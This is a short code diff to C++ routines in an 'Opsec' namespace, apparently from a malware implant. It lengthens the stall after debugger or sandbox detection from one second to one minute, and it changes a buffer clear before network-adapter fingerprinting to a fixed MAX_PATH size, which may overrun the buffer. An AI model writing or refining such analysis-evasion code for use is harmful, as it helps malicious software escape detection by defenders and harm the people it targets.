@@ -7,12 +7,12 @@ namespace Opsec {
         bool success = true;
 #ifndef DEBUG
         if (Opsec::CheckDebugger()) {
-            Utils::Time::Timeout(SECONDS(1));
+            Utils::Time::Timeout(MINUTES(1));
             success_(false);
         }
 #endif
         if (Opsec::CheckSandbox()) {
-            Utils::Time::Timeout(SECONDS(1));
+            Utils::Time::Timeout(MINUTES(1));
             success_(false);
         }
 
@@ -123,7 +123,7 @@ namespace Opsec {
             Stream::PackDword(out, 0);
         }
 
-        x_memset(buffer, 0, length);
+        x_memset(buffer, 0, MAX_PATH);
         length = sizeof(IP_ADAPTER_INFO);
 
         if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
